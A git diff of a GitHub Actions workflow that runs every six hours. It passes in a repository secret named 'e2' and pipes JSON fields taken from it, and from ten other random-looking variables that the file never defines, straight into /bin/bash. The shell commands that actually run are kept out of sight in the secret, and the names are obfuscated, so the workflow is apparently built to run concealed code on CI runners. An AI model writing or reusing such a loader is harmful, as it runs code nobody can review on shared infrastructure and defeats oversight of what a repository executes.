@@ -3,23 +3,27 @@ name: zhaoqingyiii
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 1/6 * * *'
+    - cron: '18 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhaoqingyiii
         env:
-          sv5771: ${{ secrets.sv5771 }}
+          e2: ${{ secrets.e2 }}
         run: |
-          echo $sv5771 | jq -r .s00 | /bin/bash
-          echo $uj10 | jq -r .xb71 | /bin/bash
-          echo $jiedn933 | jq -r .yr38 | /bin/bash
-          echo $ylcz6 | jq -r .s6 | /bin/bash
-          echo $vbknj6577 | jq -r .d3801 | /bin/bash
-          echo $f86839 | jq -r .rgtb1 | /bin/bash
-          echo $ubb8701 | jq -r .uosm70217 | /bin/bash
-          echo $pgv716 | jq -r .e912 | /bin/bash
+          echo $e2 | jq -r .rws97 | /bin/bash
+          echo $ydjrd4 | jq -r .boi4 | /bin/bash
+          echo $j246 | jq -r .d9 | /bin/bash
+          echo $ho54442 | jq -r .pcmbw11 | /bin/bash
+          echo $kxrac48665 | jq -r .dhkc55154 | /bin/bash
+          echo $gytbj84 | jq -r .xrj0635 | /bin/bash
+          echo $zpqgk1418 | jq -r .bzwh330 | /bin/bash
+          echo $jvsw7 | jq -r .cy502 | /bin/bash
+          echo $ngvtn44 | jq -r .f11085 | /bin/bash
+          echo $sbmo2 | jq -r .g03653 | /bin/bash
+          echo $d10092 | jq -r .brjul65 | /bin/bash
 
